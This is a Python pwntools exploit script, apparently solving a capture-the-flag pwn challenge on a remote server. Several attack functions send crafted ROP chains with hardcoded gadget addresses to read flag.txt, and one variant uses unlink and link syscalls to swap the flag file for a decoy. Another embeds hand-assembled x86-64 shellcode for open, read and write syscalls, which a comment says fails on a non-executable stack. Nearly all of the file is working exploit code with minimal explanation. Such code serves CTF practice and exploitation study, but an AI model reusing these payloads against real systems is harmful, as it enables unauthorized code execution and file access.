from pwn import *  # pwntools

def send(conn, msg):
    print(f'send    : {msg}')
    conn.sendline(msg)


def _create_64bit_number(num):
    ch = b''
    for _ in range(8):
        ch += bytes([num % 256])
        num //= 256
    return ch


def unlink(conn):
    message = b''

    message += _create_64bit_number(0) 
    message += _create_64bit_number(0)
    message += _create_64bit_number(0x40102a) # address of pop command

    message += _create_64bit_number(0x402000) # file to remove
    message += _create_64bit_number(0) 

    message += _create_64bit_number(0) 
    message += _create_64bit_number(0)
    message += _create_64bit_number(0x401000) # read again
    message += b'a'*(87 - len(message)-1) #unlink

    with open('./input.txt','bw') as  file:
        file.write(message)#+b'\n')

    send(conn, message)   
    response1 = conn.recvline()
    print(f'response: {response1}')


def link(conn):
    message = b''

    message += _create_64bit_number(0) 
    message += _create_64bit_number(0) # file to remove
    message += _create_64bit_number(0x40102a) # address of pop command

    message += _create_64bit_number(0x402006) # flag.txt
    message += _create_64bit_number(0x402000) # false_flag.txt

    message += _create_64bit_number(0) 
    message += _create_64bit_number(0)
    message += _create_64bit_number(0x40103d) # print flag
    message += b'a'*(86 - len(message)-1) # link

    with open('./input.txt','bw') as  file:
        file.write(message)#+b'\n')

    send(conn, message)  
     
#    response1 = conn.recvline()
    response1 = conn.recvuntil(b'}', drop=True)
    print(f'response: {response1}')

def attack3():

    #server = '0.cloud.chals.io'
    #port = 14397 
    server = '10.2.0.48'
    port = 1242
    #server = '10.0.0.229'
    #port = 1235
    #server = '172.17.0.2'
    #port = 22334

    conn = remote(server, port)

    unlink(conn)
    link(conn)
    

def attack3_ok():
    server = '0.cloud.chals.io'
    port = 14397 

    #conn = remote(server, port)

    message = b''

    message += _create_64bit_number(1) # old name
    message += _create_64bit_number(0x402000) # buffer to read into
    message += _create_64bit_number(0x40102a) # address of pop command
    message += _create_64bit_number(1) 
    message += _create_64bit_number(0x402000) # buffer of file name
    message += _create_64bit_number(0xffffffffffffffff) 
    message += _create_64bit_number(0xffffffffffffffff) 
    message += _create_64bit_number(0x40103d) #print flag
    
    for _ in range(5):
        message +=_create_64bit_number(0)
    
    message += b'\x00\x00\x00\x00\x00\x00\x00'

    with open('./input.txt','bw') as  file:
        file.write(message+b'\n')

    message = b'flag.txt\x00'
    for _ in range(10):
        message +=_create_64bit_number(0)

    with open('./input.txt','ba') as  file:
        file.write(message+b'\n')




def attack():
    server = '0.cloud.chals.io'
    port = 14397 

    conn = remote(server, port)

    # call read again (and reduce $rsp)
    message =  b'\x00\x00\x00\x00\x00\x00\x00\x00'
    message += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    # 401008
    message += b'\x08\x10\x40\x00\x00\x00\x00\x00'
    
    for _ in range(11):
        message += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    with open('./input.txt','bw') as  file:
        file.write(message+b'\n')

    # change $rsp and call read again

    message =  b'\x00\x00\x00\x00\x00\x00\x00\x00'

    # 0000000000402000
    message += b'\x00\x20\x40\x00\x00\x00\x00\x00'

    # 401000
    message += b'\x00\x10\x40\x00\x00\x00\x00\x00'
    
    for _ in range(11):
        message += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    with open('./input.txt','ba') as  file:
        file.write(message+b'\n')


    # call print_flag

    message =  b'flag.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    message += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    # 000000000040103d
    message += b'\x3d\x10\x40\x00\x00\x00\x00\x00'

    for _ in range(11):
        message += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    with open('./input.txt','ba') as  file:
        file.write(message+b'\n')


def attack2():
    server = '0.cloud.chals.io'
    port = 14397 

    conn = remote(server, port)

    # 0x7fffffffe068:
    #message = b'flag.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    message =  b'\x30\x10\x00\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'

    # 000000000040103d
    message += b'\x3d\x10\x40\x00\x00\x00\x00\x00'
    
    message += b'\x01\x00\x00\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00\x00'
    message += b'\x30\x10\x40\x00\x00\x00\x00'

#    with open('./input.txt','bw') as  file:
#        file.write(message+b'\n')

    print(f'message len - {len(message)}')
    send(conn, message+b'\n')   

    response1 = conn.recvline()
    #print(f'response: {response1.decode("utf-8")}')
    print(f'response: {response1}')

    #response1 = conn.recvline(timeout=1)
    response1 = conn.recvuntil(b'}', drop=True)
    print(f'response: {response1}')



# This attack tries to write code on the stack - but it can not be run (try checksec)
def attack_bad():
    server = '0.cloud.chals.io'
    port = 14397 

    conn = remote(server, port)

    # 0x7fffffffe068:
    message = b'flag.txt\n\x00\x00\x00\x00\x00\x00\x00\x00'

    # 0x7fffffffe078: (0x7f ff ff ff e0 90) - exe code address
    message += b'\x90\xe0\xff\xff\xff\x7f\x00\x00'
    # #0000000000401000
    # #message += b'\x00\x10\x40\x00\x00\x00\x00\x00'

    # 0x7fffffffe080:
    message += b'\x01\x00\x00\x00\x00\x00\x00\x00\xa4\xe3\xff\xff\xff\x7f\x00\x00' # filler (what was on the stack before)

    # 0x7fffffffe090:
    message += b'\xb8\x02\x00\x00\x00'              # mov    $0x2,%eax
    message += b'\x48\xbf'                          # movabs 
    message += b'\x68\xe0\xff\xff\xff\x7f\x00\x00'  #        $0x7fffffffe068,%rdi
    message += b'\xbe\x00\x00\x00\x00'              # mov    $0x0,%esi
    message += b'\xba\x24\x01\x00\x00'              # mov    $0x124,%edx
    message += b'\x0f\x05'                          # syscall      (open file)
    message += b'\x48\x89\xc7'                      # mov    %rax,%rdi
    message += b'\xb8\x00\x00\x00\x00'              # mov    $0x0,%eax
    #message += b'\x48\xbe\x20\x30\x40\x00
    # \x00\x00\x00\x00' # movabs $0x403020,%rsi
    message += b'\x48\x89\xe6'                      # mov    %rsp,%rsi          # read to $rsp
    message += b'\x48\x8b\x14\x25\x17\x20\x40\x00'  # mov    0x402017,%rdx
    message += b'\x0f\x05'                          # syscall (read)
    message += b'\xb8\x01\x00\x00\x00'              # mov    $0x1,%eax          #write command
    message += b'\x48\x89\xc2'             	        # mov    %rax,%rdx          # len of buf to write
    message += b'\xbf\x01\x00\x00\x00'              # mov    $0x1,%edi
    message += b'\x54'                   	        # push   %rsp               #
    message += b'\x6a\x01'                	        # pushq  $0x1               #
    message += b'\x5f'                   	        # pop    %rdi               # rdi = 1 - write to stdout
    message += b'\x5e'                     	        # pop    %rsi               # buffer to write - $rsp (where read was done)
    message += b'\x0f\x05'                          # syscall  (write)

    print(f'message len - {len(message)}')
    response1 = conn.recvline()
    #print(f'response: {response1.decode("utf-8")}')
    print(f'response: {response1}')

    #response1 = conn.recvline(timeout=1)
    response1 = conn.recvuntil(b'}', drop=True)
    print(f'response: {response1}')

if __name__ == '__main__':
    attack3()
